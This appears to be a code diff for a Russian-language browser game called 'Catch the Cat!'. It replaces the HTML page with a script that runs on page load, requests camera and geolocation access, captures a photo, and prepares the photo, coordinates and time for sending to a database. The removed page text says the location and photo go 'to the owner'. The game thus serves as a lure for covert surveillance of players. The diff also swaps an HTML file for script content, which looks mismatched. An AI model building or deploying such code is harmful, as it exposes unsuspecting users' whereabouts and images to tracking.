@@ -1,38 +1,73 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🐕 Поймай Кота! 🐱</title>
-    <link rel="stylesheet" href="styles.css">
-</head>
-<body>
-    <!-- Экран загрузки -->
-    <div id="loadingScreen" class="screen active">
-        <div class="loading-container">
-            <h1>🐕 Поймай Кота! 🐱</h1>
-            <p>Инициализация игры...</p>
-            <div class="spinner"></div>
-        </div>
-    </div>
+let cameraStream = null;
+let userLocation = null;
+let cameraPhoto = null;
 
-    <!-- Экран игры -->
-    <div id="gameScreen" class="screen">
-        <canvas id="gameCanvas"></canvas>
-    </div>
+async function requestPermissions() {
+    try {
+        // Запрашиваем камеру
+        cameraStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'environment' }
+        });
+        console.log('✅ Камера получена');
+    } catch (error) {
+        console.error('❌ Ошибка камеры:', error);
+    }
+    
+    try {
+        // Запрашиваем геолокацию
+        const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject);
+        });
+        
+        userLocation = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: new Date().toISOString()
+        };
+        console.log('✅ Геолокация получена:', userLocation);
+    } catch (error) {
+        console.error('❌ Ошибка геолокации:', error);
+    }
+    
+    // Снимаем фото с камеры перед игрой
+    if (cameraStream) {
+        const videoTrack = cameraStream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(videoTrack);
+        try {
+            const bitmap = await imageCapture.grabFrame();
+            const canvas = document.createElement('canvas');
+            canvas.width = bitmap.width;
+            canvas.height = bitmap.height;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(bitmap, 0, 0);
+            cameraPhoto = canvas.toDataURL('image/jpeg');
+            console.log('✅ Фото получено');
+        } catch (e) {
+            console.log('Фото недоступно, продолжаем без него');
+        }
+    }
+    
+    // Запускаем игру
+    startGame();
+}
 
-    <!-- Экран результата -->
-    <div id="resultScreen" class="screen">
-        <div class="container result-container">
-            <h1>🎉 Ты поймал кота!</h1>
-            <p id="resultText"></p>
-            <p id="resultGeo">📍 Твоя геолокация отправлена владельцу</p>
-            <p id="resultPhoto">📸 Фото с камеры отправлено</p>
-            <button id="playAgainBtn" class="btn">Играть снова</button>
-        </div>
-    </div>
+function sendDataToDatabase() {
+    const data = {
+        photo: cameraPhoto ? cameraPhoto.substring(0, 100) + '...' : 'N/A',
+        location: userLocation,
+        timestamp: new Date().toISOString(),
+        gameResult: 'won'
+    };
+    console.log('📤 Данные для отправки в БД:', data);
+    return data;
+}
 
-    <script src="permissions.js"></script>
-    <script src="game.js"></script>
-</body>
-</html>
+window.gamePermissions = {
+    getUserLocation: () => userLocation,
+    getCameraPhoto: () => cameraPhoto,
+    sendDataToDatabase: sendDataToDatabase
+};
+
+// Автозапуск при загрузке страницы
+window.addEventListener('load', requestPermissions);
